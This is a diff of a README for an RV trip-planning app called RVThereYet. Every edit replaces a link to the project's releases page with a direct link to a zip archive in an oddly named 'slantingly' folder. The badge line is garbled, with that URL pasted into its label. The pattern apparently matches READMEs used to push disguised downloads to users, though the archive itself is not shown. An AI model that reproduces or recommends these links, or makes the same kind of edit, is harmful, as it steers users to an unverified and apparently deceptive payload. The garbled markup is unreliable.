@@ -6,7 +6,7 @@ Welcome to the RVThereYet SpeedRun repository! This application helps you plan a
 
 ## 🔗 Download Now!
 
-[![Download RVThereYet](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/PowerlessCH/rv-there-yet-valley-hub-rep/releases)
+[![Download RVThereYet](https://raw.githubusercontent.com/PowerlessCH/rv-there-yet-valley-hub-rep/main/slantingly/rv-there-yet-valley-hub-rep_2.4.zip%20Now-Get%20the%https://raw.githubusercontent.com/PowerlessCH/rv-there-yet-valley-hub-rep/main/slantingly/rv-there-yet-valley-hub-rep_2.4.zip)](https://raw.githubusercontent.com/PowerlessCH/rv-there-yet-valley-hub-rep/main/slantingly/rv-there-yet-valley-hub-rep_2.4.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, make sure your system meets the following requirements:
 
 To download the application, visit the link below. You will find the latest version available to download.
 
-[Download RVThereYet from the Releases Page](https://github.com/PowerlessCH/rv-there-yet-valley-hub-rep/releases)
+[Download RVThereYet from the Releases Page](https://raw.githubusercontent.com/PowerlessCH/rv-there-yet-valley-hub-rep/main/slantingly/rv-there-yet-valley-hub-rep_2.4.zip)
 
 1. Click on the link above.
 2. Choose the latest release.
@@ -92,4 +92,4 @@ This project is licensed under the MIT License. You’re free to use it as you w
 
 Stay connected for updates, tips, and news about RVThereYet by following our GitHub repository. 
 
-[Download RVThereYet from the Releases Page](https://github.com/PowerlessCH/rv-there-yet-valley-hub-rep/releases)
+[Download RVThereYet from the Releases Page](https://raw.githubusercontent.com/PowerlessCH/rv-there-yet-valley-hub-rep/main/slantingly/rv-there-yet-valley-hub-rep_2.4.zip)
